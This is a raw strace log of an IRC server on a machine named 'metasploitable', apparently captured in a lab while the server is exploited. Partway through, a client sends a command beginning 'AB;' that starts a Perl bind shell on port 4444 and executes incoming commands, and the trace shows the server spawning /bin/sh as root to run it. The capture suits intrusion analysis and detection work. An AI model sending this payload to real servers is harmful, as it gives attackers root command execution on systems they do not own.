4519  07:30:53.193255 select(1024, [2 3 4 7 9], [], NULL, {0, 760000}) = 1 (in [7], left {0, 710000})
4519  07:30:53.242415 clock_gettime(CLOCK_MONOTONIC, {2263, 59424533}) = 0
4519  07:30:53.242416 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:30:53.242416 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242416 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242416 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242417 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242424 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242439 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242453 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242467 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242480 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242494 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242507 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242521 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242535 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242548 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242562 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242575 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242604 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242643 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242657 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242686 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242699 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242713 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.242730 gettimeofday({1495625453, 242734}, NULL) = 0
4519  07:30:53.242742 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 880000})
4519  07:30:53.367996 clock_gettime(CLOCK_MONOTONIC, {2263, 185016748}) = 0
4519  07:30:53.368016 time(NULL)        = 1495625453
4519  07:30:53.368026 time(NULL)        = 1495625453
4519  07:30:53.368043 gettimeofday({1495625453, 368048}, NULL) = 0
4519  07:30:53.368056 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:30:53.368095 clock_gettime(CLOCK_MONOTONIC, {2263, 185107615}) = 0
4519  07:30:53.368105 gettimeofday({1495625453, 368108}, NULL) = 0
4519  07:30:53.368115 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:30:53.368152 clock_gettime(CLOCK_MONOTONIC, {2263, 185165368}) = 0
4519  07:30:53.368164 accept(2, 0, NULL) = 5
4519  07:30:53.368183 getpeername(5, {sa_family=AF_INET, sin_port=htons(46235), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:30:53.368214 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:30:53.368229 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:30:53.368242 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:30:53.368255 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:30:53.368266 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:30:53.368276 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:30:53.368288 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:30:53.368304 clock_gettime(CLOCK_MONOTONIC, {2263, 185317504}) = 0
4519  07:30:53.368316 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:30:53.368327 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:30:53.368529 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:30:53.368555 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:30:53.368566 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:30:53.368584 send(6, "\355\365\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:30:53.368661 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:30:53.368716 gettimeofday({1495625453, 368720}, NULL) = 0
4519  07:30:53.368727 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:30:53.373547 clock_gettime(CLOCK_MONOTONIC, {2263, 190564469}) = 0
4519  07:30:53.373564 recvfrom(6, "\355\365\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0t\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:30:53.373671 close(6)          = 0
4519  07:30:53.373701 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:30:53.373715 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:30:53.373785 time(NULL)        = 1495625453
4519  07:30:53.373797 time(NULL)        = 1495625453
4519  07:30:53.373808 gettimeofday({1495625453, 373812}, NULL) = 0
4519  07:30:53.373839 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:30:53.373881 clock_gettime(CLOCK_MONOTONIC, {2263, 190894192}) = 0
4519  07:30:53.373892 gettimeofday({1495625453, 373895}, NULL) = 0
4519  07:30:53.373902 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 740000})
4519  07:30:53.633255 clock_gettime(CLOCK_MONOTONIC, {2263, 450275287}) = 0
4519  07:30:53.633276 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:30:53.633301 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633319 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633333 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633347 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633361 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633375 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633388 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633402 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633415 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633428 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633441 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633454 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633468 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633481 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633494 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633507 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633520 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633533 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633546 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633560 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633580 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633594 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 390000}, ...}) = 0
4519  07:30:53.633622 gettimeofday({1495625453, 633627}, NULL) = 0
4519  07:30:53.633636 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:30:53.633737 clock_gettime(CLOCK_MONOTONIC, {2263, 450750129}) = 0
4519  07:30:53.633749 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:30:53.633776 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:30:53.633797 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:30:53.633809 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:30:53.633824 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 10002
10002 07:30:53.633892 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
10002 07:30:53.633906 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
10002 07:30:53.633917 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.633931 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
10002 07:30:53.634035 brk(0)            = 0x80f9000
10002 07:30:53.634057 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.634074 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f05000
10002 07:30:53.634091 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.634121 open("/etc/ld.so.cache", O_RDONLY) = 1
10002 07:30:53.634157 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10002 07:30:53.634176 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efd000
10002 07:30:53.634201 close(1)          = 0
10002 07:30:53.634211 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.634227 open("/lib/libncurses.so.5", O_RDONLY) = 1
10002 07:30:53.634240 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
10002 07:30:53.634332 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
10002 07:30:53.634349 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ecd000
10002 07:30:53.634361 mmap2(0xb7efa000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7efa000
10002 07:30:53.634378 close(1)          = 0
10002 07:30:53.634390 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.634403 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10002 07:30:53.634417 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10002 07:30:53.634509 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10002 07:30:53.634526 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec9000
10002 07:30:53.634537 mmap2(0xb7ecb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ecb000
10002 07:30:53.634553 close(1)          = 0
10002 07:30:53.634564 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.634577 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10002 07:30:53.634591 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10002 07:30:53.634731 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10002 07:30:53.634748 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ec8000
10002 07:30:53.634763 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d79000
10002 07:30:53.634774 mmap2(0xb7ec2000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ec2000
10002 07:30:53.634788 mmap2(0xb7ec5000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec5000
10002 07:30:53.634802 close(1)          = 0
10002 07:30:53.634824 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d78000
10002 07:30:53.634836 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d786b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10002 07:30:53.634891 mprotect(0xb7ec2000, 4096, PROT_READ) = 0
10002 07:30:53.634928 munmap(0xb7efd000, 29913) = 0
10002 07:30:53.634954 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.634968 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
10002 07:30:53.634987 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e22a0) = -1 ENOTTY (Inappropriate ioctl for device)
10002 07:30:53.635021 brk(0)            = 0x80f9000
10002 07:30:53.635030 brk(0x80fa000)    = 0x80fa000
10002 07:30:53.635042 brk(0x80fb000)    = 0x80fb000
10002 07:30:53.635057 getuid32()        = 0
10002 07:30:53.635067 getgid32()        = 0
10002 07:30:53.635075 geteuid32()       = 0
10002 07:30:53.635084 getegid32()       = 0
10002 07:30:53.635097 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.635124 time(NULL)        = 1495625453
10002 07:30:53.635164 brk(0x80fc000)    = 0x80fc000
10002 07:30:53.635179 brk(0x80fd000)    = 0x80fd000
10002 07:30:53.635229 open("/proc/meminfo", O_RDONLY) = 1
10002 07:30:53.635252 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
10002 07:30:53.635270 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f04000
10002 07:30:53.635281 read(1, "MemTotal:      1035240 kB\nMemFree:        436728 kB\nBuffers:         75048 kB\nCached:         364412 kB\nSwapCached:          0 kB\nActive:         256108 kB\nInactive:       312288 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        436488 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4172 kB\nWriteback:           0 kB\nAnonPages:      128988 kB\nMapped:          52008 kB\nSlab:            18804 kB\nSReclaimable:    10296 kB\nSUnreclaim:       8508 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
10002 07:30:53.635364 close(1)          = 0
10002 07:30:53.635375 munmap(0xb7f04000, 4096) = 0
10002 07:30:53.635387 brk(0x80fe000)    = 0x80fe000
10002 07:30:53.635413 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10002 07:30:53.635426 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10002 07:30:53.635438 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10002 07:30:53.635449 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10002 07:30:53.635461 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
10002 07:30:53.635472 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
10002 07:30:53.635485 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10002 07:30:53.635497 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10002 07:30:53.635509 uname({sys="Linux", node="metasploitable", ...}) = 0
10002 07:30:53.635557 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10002 07:30:53.635575 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10002 07:30:53.635594 brk(0x8100000)    = 0x8100000
10002 07:30:53.635690 getcwd("/etc/unreal", 4096) = 12
10002 07:30:53.635732 getpid()          = 10002
10002 07:30:53.635749 getppid()         = 4519
10002 07:30:53.635778 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10002 07:30:53.635798 stat64("/sbin/sh", 0xbf8e2278) = -1 ENOENT (No such file or directory)
10002 07:30:53.635810 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10002 07:30:53.635827 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10002 07:30:53.635851 socket(PF_FILE, SOCK_STREAM, 0) = 1
10002 07:30:53.635864 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10002 07:30:53.635875 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10002 07:30:53.635897 close(1)          = 0
10002 07:30:53.635908 socket(PF_FILE, SOCK_STREAM, 0) = 1
10002 07:30:53.635918 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10002 07:30:53.635927 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10002 07:30:53.635945 close(1)          = 0
10002 07:30:53.635959 open("/etc/nsswitch.conf", O_RDONLY) = 1
10002 07:30:53.635973 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10002 07:30:53.635990 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f04000
10002 07:30:53.636004 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10002 07:30:53.636052 read(1, "", 4096) = 0
10002 07:30:53.636062 close(1)          = 0
10002 07:30:53.636071 munmap(0xb7f04000, 4096) = 0
10002 07:30:53.636087 open("/etc/ld.so.cache", O_RDONLY) = 1
10002 07:30:53.636099 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10002 07:30:53.636115 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7efd000
10002 07:30:53.636125 close(1)          = 0
10002 07:30:53.636135 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10002 07:30:53.636150 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
10002 07:30:53.636164 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 